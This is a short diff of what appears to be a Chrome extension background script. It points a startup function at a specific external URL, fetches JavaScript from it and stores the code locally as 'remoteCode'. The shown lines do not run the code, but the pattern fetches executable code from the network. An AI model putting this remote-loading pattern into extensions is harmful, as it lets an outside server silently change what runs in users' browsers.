@@ -7,7 +7,7 @@ chrome.runtime.onStartup.addListener(() => {
 });
 
 function fetchAndStoreScript() {
-  fetch("https://yourdomain.com/latest-script.js")
+  fetch("https://homelesspigeon.vercel.app/core/pigeonbrain.js")
     .then(res => res.text())
     .then(code => {
       chrome.storage.local.set({ remoteCode: code }, () => {
